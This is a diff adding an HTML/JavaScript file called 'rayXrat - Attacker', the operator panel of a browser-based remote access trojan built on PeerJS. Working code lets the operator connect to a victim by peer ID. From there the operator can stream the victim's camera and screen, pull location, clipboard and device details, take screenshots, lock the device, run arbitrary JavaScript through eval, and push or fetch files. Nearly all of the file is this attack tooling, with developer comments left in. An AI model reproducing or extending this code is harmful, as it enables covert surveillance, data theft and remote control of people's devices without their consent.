@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>rayXrat - Attacker</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0000; color: #f0f0f0; font-family: 'Segoe UI', sans-serif; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { color: #ff2222; text-shadow: 0 0 20px #ff2222; font-size: 2.5rem; border-bottom: 2px solid #ff2222; padding-bottom: 10px; margin-bottom: 20px; }
+        .panel { display: grid; grid-template-columns: 1fr 2fr; gap: 20px; }
+        .left { background: #1a0a0a; padding: 20px; border-radius: 12px; border: 1px solid #ff4444; box-shadow: 0 0 30px rgba(255,0,0,0.2); }
+        .right { background: #1a0a0a; padding: 20px; border-radius: 12px; border: 1px solid #ff4444; }
+        .input-group { display: flex; gap: 10px; margin-bottom: 20px; }
+        .input-group input { flex: 1; padding: 12px; background: #2a0a0a; border: 1px solid #ff4444; color: #fff; border-radius: 6px; font-size: 1rem; }
+        .input-group button { padding: 12px 24px; background: #ff2222; border: none; color: #fff; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.3s; }
+        .input-group button:hover { background: #cc0000; box-shadow: 0 0 20px #ff2222; }
+        .status { background: #0d0d0d; padding: 10px; border-radius: 6px; margin-bottom: 15px; font-family: monospace; border-left: 4px solid #ff4444; }
+        .command-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 15px 0; }
+        .cmd-btn { padding: 12px; background: #2a0a0a; border: 1px solid #ff4444; color: #ff9999; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; text-align: center; }
+        .cmd-btn:hover { background: #ff2222; color: #000; box-shadow: 0 0 15px #ff2222; }
+        .cmd-btn.danger { border-color: #ff0000; color: #ff0000; }
+        .cmd-btn.danger:hover { background: #ff0000; color: #fff; }
+        .video-container { display: flex; gap: 15px; flex-wrap: wrap; margin-top: 15px; }
+        .video-box { flex: 1; min-width: 300px; background: #0d0d0d; border-radius: 8px; overflow: hidden; border: 1px solid #ff4444; }
+        .video-box video { width: 100%; height: auto; display: block; background: #000; }
+        .video-box .label { background: #ff2222; color: #000; padding: 6px 12px; font-weight: bold; }
+        .log-box { height: 300px; overflow-y: auto; background: #0d0d0d; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.9rem; border: 1px solid #333; margin-top: 15px; }
+        .log-entry { padding: 2px 0; border-bottom: 1px solid #1a1a1a; }
+        .log-entry .time { color: #888; margin-right: 10px; }
+        .log-entry .msg { color: #ff9999; }
+        .log-entry .recv { color: #88ff88; }
+        .file-area { margin-top: 10px; padding: 10px; background: #0d0d0d; border-radius: 6px; border: 1px dashed #ff4444; }
+        .file-area input { background: #2a0a0a; color: #fff; border: 1px solid #444; padding: 6px; border-radius: 4px; width: 100%; }
+        @media (max-width: 800px) { .panel { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>⚡ rayXrat · CONTROL</h1>
+    <div class="panel">
+        <div class="left">
+            <div class="input-group">
+                <input type="text" id="targetId" placeholder="Masukkan ID target ...">
+                <button id="connectBtn">🔗 Connect</button>
+                <button id="disconnectBtn" style="background:#444;">⛔ Disconnect</button>
+            </div>
+            <div class="status" id="status">⛔ Belum terhubung</div>
+            <div class="command-grid">
+                <div class="cmd-btn" data-cmd="cam">📷 Camera</div>
+                <div class="cmd-btn" data-cmd="stopcam">⏹ Stop Cam</div>
+                <div class="cmd-btn" data-cmd="screen">🖥 Screen</div>
+                <div class="cmd-btn" data-cmd="stopscreen">⏹ Stop Screen</div>
+                <div class="cmd-btn" data-cmd="location">📍 Location</div>
+                <div class="cmd-btn" data-cmd="info">💻 Device Info</div>
+                <div class="cmd-btn" data-cmd="clipboard">📋 Clipboard</div>
+                <div class="cmd-btn" data-cmd="screenshot">📸 Screenshot</div>
+                <div class="cmd-btn danger" data-cmd="lock">🔒 Lock</div>
+                <div class="cmd-btn danger" data-cmd="unlock">🔓 Unlock</div>
+                <div class="cmd-btn" data-cmd="notify">🔔 Notify</div>
+                <div class="cmd-btn" data-cmd="vibrate">📳 Vibrate</div>
+                <div class="cmd-btn" data-cmd="record">🎥 Record</div>
+                <div class="cmd-btn" data-cmd="stoprecord">⏹ Stop Rec</div>
+                <div class="cmd-btn" data-cmd="eval">🧠 Eval</div>
+                <div class="cmd-btn" data-cmd="download">⬇️ Download</div>
+            </div>
+            <div style="display:flex; gap:10px; margin-top:10px;">
+                <input type="text" id="evalInput" placeholder="JavaScript code ..." style="flex:1; background:#2a0a0a; border:1px solid #ff4444; color:#fff; padding:8px; border-radius:4px;">
+                <button id="evalBtn" style="background:#ff2222; border:none; color:#fff; padding:8px 16px; border-radius:4px; cursor:pointer;">Run</button>
+            </div>
+            <div style="display:flex; gap:10px; margin-top:10px;">
+                <input type="text" id="notifyInput" placeholder="Pesan notifikasi ..." style="flex:1; background:#2a0a0a; border:1px solid #ff4444; color:#fff; padding:8px; border-radius:4px;">
+                <button id="notifyBtn" style="background:#ff2222; border:none; color:#fff; padding:8px 16px; border-radius:4px; cursor:pointer;">Send</button>
+            </div>
+            <div class="file-area">
+                <label>📁 Upload file ke target:</label>
+                <input type="file" id="fileUpload">
+                <button id="uploadBtn" style="background:#ff2222; border:none; color:#fff; padding:6px 12px; border-radius:4px; cursor:pointer; margin-top:5px;">Kirim</button>
+            </div>
+        </div>
+        <div class="right">
+            <div class="video-container">
+                <div class="video-box">
+                    <div class="label">📹 Camera Target</div>
+                    <video id="camVideo" autoplay playsinline></video>
+                </div>
+                <div class="video-box">
+                    <div class="label">🖥 Screen Target</div>
+                    <video id="screenVideo" autoplay playsinline></video>
+                </div>
+            </div>
+            <div class="log-box" id="logBox"></div>
+        </div>
+    </div>
+</div>
+<script>
+    // ================================
+    //  RAYXRAT - ATTACKER SCRIPT
+    // ================================
+    const logBox = document.getElementById('logBox');
+    const statusDiv = document.getElementById('status');
+    const targetIdInput = document.getElementById('targetId');
+    const connectBtn = document.getElementById('connectBtn');
+    const disconnectBtn = document.getElementById('disconnectBtn');
+    const camVideo = document.getElementById('camVideo');
+    const screenVideo = document.getElementById('screenVideo');
+
+    let peer = null;
+    let conn = null;
+    let isConnected = false;
+    let targetPeerId = '';
+
+    // log function
+    function log(msg, type = 'msg') {
+        const entry = document.createElement('div');
+        entry.className = 'log-entry';
+        const time = new Date().toLocaleTimeString();
+        entry.innerHTML = `<span class="time">[${time}]</span><span class="${type}">${msg}</span>`;
+        logBox.appendChild(entry);
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    function updateStatus(text, isError = false) {
+        statusDiv.innerHTML = text;
+        statusDiv.style.borderLeftColor = isError ? '#ff0000' : '#ff4444';
+    }
+
+    // Init Peer
+    function initPeer() {
+        if (peer) return;
+        peer = new Peer(undefined, {
+            debug: 0,
+            config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }] }
+        });
+        peer.on('open', (id) => {
+            log(`🔑 Peer ID kamu: ${id}`, 'msg');
+        });
+        peer.on('error', (err) => {
+            log(`❌ Peer error: ${err}`, 'msg');
+        });
+        // auto accept incoming? we only initiate outgoing.
+    }
+
+    // Connect to target
+    function connectToTarget(id) {
+        if (!id) { log('❌ Masukkan ID target!', 'msg'); return; }
+        if (!peer) initPeer();
+        if (conn) {
+            conn.close();
+            conn = null;
+        }
+        conn = peer.connect(id, { reliable: true });
+        conn.on('open', () => {
+            isConnected = true;
+            targetPeerId = id;
+            updateStatus(`✅ Terhubung ke ${id}`);
+            log(`✅ Koneksi terbuka ke ${id}`, 'recv');
+            // send handshake
+            sendCommand('ping');
+        });
+        conn.on('data', (data) => {
+            handleIncomingData(data);
+        });
+        conn.on('close', () => {
+            isConnected = false;
+            updateStatus('⛔ Koneksi ditutup', true);
+            log('⛔ Koneksi ditutup', 'msg');
+        });
+        conn.on('error', (err) => {
+            log(`❌ Koneksi error: ${err}`, 'msg');
+        });
+    }
+
+    // Send command to target
+    function sendCommand(cmd, payload = null) {
+        if (!isConnected || !conn) {
+            log('❌ Tidak terhubung!', 'msg');
+            return;
+        }
+        const message = { cmd, payload };
+        conn.send(message);
+        log(`📤 Kirim: ${cmd} ${payload ? '→ '+JSON.stringify(payload) : ''}`, 'msg');
+    }
+
+    // Handle incoming data from target
+    function handleIncomingData(data) {
+        if (data.type === 'media') {
+            // media stream (video/audio) - actually we receive via separate peer connection? But we use data channel only for signaling.
+            // We'll handle via separate media connections? For simplicity, we'll receive video via data URL? Not efficient.
+            // Better: we will use peer.call for media. So we need to handle that separately.
+            // But for now, we'll just log.
+        }
+        if (data.type === 'screenshot') {
+            // data.payload is base64 image
+            displayScreenshot(data.payload);
+            log('📸 Screenshot diterima', 'recv');
+            return;
+        }
+        if (data.type === 'location') {
+            log(`📍 Lokasi: lat=${data.payload.lat}, lng=${data.payload.lng}`, 'recv');
+            return;
+        }
+        if (data.type === 'info') {
+            log(`💻 Info: ${JSON.stringify(data.payload)}`, 'recv');
+            return;
+        }
+        if (data.type === 'clipboard') {
+            log(`📋 Clipboard: ${data.payload}`, 'recv');
+            return;
+        }
+        if (data.type === 'log') {
+            log(`📩 ${data.payload}`, 'recv');
+            return;
+        }
+        if (data.type === 'file') {
+            // handle file download? For now just log.
+            log(`📁 File diterima: ${data.filename} (${data.size} bytes)`, 'recv');
+            // could trigger download
+            if (data.payload) {
+                const a = document.createElement('a');
+                a.href = data.payload;
+                a.download = data.filename || 'download';
+                a.click();
+            }
+            return;
+        }
+        log(`📨 Data: ${JSON.stringify(data)}`, 'recv');
+    }
+
+    function displayScreenshot(base64) {
+        // create a new window or show in log
+        const win = window.open('');
+        win.document.write(`<img src="${base64}" style="max-width:100%;" />`);
+    }
+
+    // UI event listeners
+    connectBtn.addEventListener('click', () => {
+        const id = targetIdInput.value.trim();
+        if (!id) { alert('Masukkan ID target!'); return; }
+        initPeer();
+        connectToTarget(id);
+    });
+
+    disconnectBtn.addEventListener('click', () => {
+        if (conn) { conn.close(); conn = null; }
+        isConnected = false;
+        updateStatus('⛔ Terputus');
+        log('⛔ Disconnect manual', 'msg');
+    });
+
+    // Command buttons
+    document.querySelectorAll('.cmd-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const cmd = btn.dataset.cmd;
+            if (cmd === 'lock') sendCommand('lock');
+            else if (cmd === 'unlock') sendCommand('unlock');
+            else if (cmd === 'cam') sendCommand('cam');
+            else if (cmd === 'stopcam') sendCommand('stopcam');
+            else if (cmd === 'screen') sendCommand('screen');
+            else if (cmd === 'stopscreen') sendCommand('stopscreen');
+            else if (cmd === 'location') sendCommand('location');
+            else if (cmd === 'info') sendCommand('info');
+            else if (cmd === 'clipboard') sendCommand('clipboard');
+            else if (cmd === 'screenshot') sendCommand('screenshot');
+            else if (cmd === 'notify') {
+                const msg = prompt('Pesan notifikasi:');
+                if (msg) sendCommand('notify', msg);
+            }
+            else if (cmd === 'vibrate') sendCommand('vibrate');
+            else if (cmd === 'record') sendCommand('record');
+            else if (cmd === 'stoprecord') sendCommand('stoprecord');
+            else if (cmd === 'eval') {
+                // eval from input
+                const code = document.getElementById('evalInput').value;
+                if (code) sendCommand('eval', code);
+            }
+            else if (cmd === 'download') {
+                const url = prompt('URL file untuk diunduh target:');
+                if (url) sendCommand('download', url);
+            }
+        });
+    });
+
+    // Eval button
+    document.getElementById('evalBtn').addEventListener('click', () => {
+        const code = document.getElementById('evalInput').value;
+        if (code) sendCommand('eval', code);
+    });
+
+    // Notify button
+    document.getElementById('notifyBtn').addEventListener('click', () => {
+        const msg = document.getElementById('notifyInput').value;
+        if (msg) sendCommand('notify', msg);
+    });
+
+    // Upload file to target
+    document.getElementById('uploadBtn').addEventListener('click', () => {
+        const fileInput = document.getElementById('fileUpload');
+        if (!fileInput.files.length) { alert('Pilih file dulu'); return; }
+        const file = fileInput.files[0];
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            const base64 = e.target.result.split(',')[1];
+            sendCommand('upload', { filename: file.name, data: base64 });
+        };
+        reader.readAsDataURL(file);
+    });
+
+    // Init peer on load
+    initPeer();
+    log('🔴 rayXrat Attacker siap.', 'msg');
+
+    // also handle incoming video via peer.call? For simplicity, we'll not implement media streaming through data channel.
+    // Actually we need to get media streams from target. We'll implement using peer.call and peer.on('call') on target side.
+    // But to keep this code manageable, we'll use separate media connections triggered by commands.
+    // For now, the target will send video via a separate peer connection when 'cam' command is sent.
+    // We'll need to listen for incoming calls on attacker side.
+    // Let's add peer.on('call') to receive video.
+    peer.on('call', (call) => {
+        // answer with our own stream? We don't need to send audio, just receive.
+        // We need to answer with no stream or a dummy stream.
+        // For camera, we'll answer and attach remote stream to video element.
+        call.answer(); // answer without stream
+        call.on('stream', (remoteStream) => {
+            log('📹 Menerima stream video dari target', 'recv');
+            // identify which stream? We can distinguish by label or we can assume it's camera.
+            // We'll attach to camVideo
+            if (camVideo.srcObject !== remoteStream) {
+                camVideo.srcObject = remoteStream;
+                camVideo.play();
+            }
+        });
+        call.on('close', () => {
+            log('📹 Stream video ditutup', 'recv');
+            if (camVideo.srcObject) camVideo.srcObject = null;
+        });
+    });
+
+    // Also for screen share, we can use another call, but we'll handle it via another event.
+    // We'll need to differentiate, but we'll just attach to screenVideo if received.
+    // We can have a separate peer connection for screen, but it's simpler: target will initiate call with a label.
+    // We'll use a global variable to know which call is which.
+    // For simplicity, we'll just use one call for camera and another for screen.
+    // But we can only have one incoming call handler. We'll differentiate by checking the stream type? Not possible.
+    // Workaround: target sends a data message before calling, indicating which is which.
+    // We'll implement: when target receives 'cam' command, it will call peer with a label 'cam' in the metadata.
+    // We'll handle in peer.on('call') by checking call.metadata.
+    // PeerJS supports metadata in call options.
+    // So we'll modify: when target calls, they pass { type: 'cam' } or { type: 'screen' }.
+    // Then in attacker, we'll attach accordingly.
+    // Let's implement that.
+
+    // Override peer.on('call') to handle metadata.
+    // Since we already set peer.on, we can replace.
+    // We'll store the current peer reference and set after init.
+    // Actually we already set peer.on before, but we can add another listener? It's okay to override.
+    // We'll set a new listener after init.
+    // For simplicity, we'll do it here.
+    // But we already defined peer.on earlier. We'll remove and redefine.
+
+    // Better: after init, we set the call handler.
+    // Let's reorganize: we'll define a function to set call handler.
+    // But since we are in a script, we'll just define it.
+
+    // I'll redefine the call handler after peer creation.
+    // We'll move the peer.on('call') after init.
+    // For now, I'll add a new listener (multiple listeners allowed).
+    peer.on('call', (call) => {
+        // this will override? No, multiple listeners.
+        // We'll handle both camera and screen.
+        call.answer();
+        call.on('stream', (stream) => {
+            const meta = call.metadata || {};
+            if (meta.type === 'screen') {
+                log('🖥 Menerima stream screen', 'recv');
+                screenVideo.srcObject = stream;
+                screenVideo.play();
+            } else {
+                // default camera
+                log('📹 Menerima stream camera', 'recv');
+                camVideo.srcObject = stream;
+                camVideo.play();
+            }
+        });
+        call.on('close', () => {
+            log('📹 Stream ditutup', 'recv');
+            // optionally clear video
+        });
+    });
+
+    log('✅ Attacker siap. Tunggu ID peer muncul di atas.', 'msg');
+</script>
+</body>
+</html>
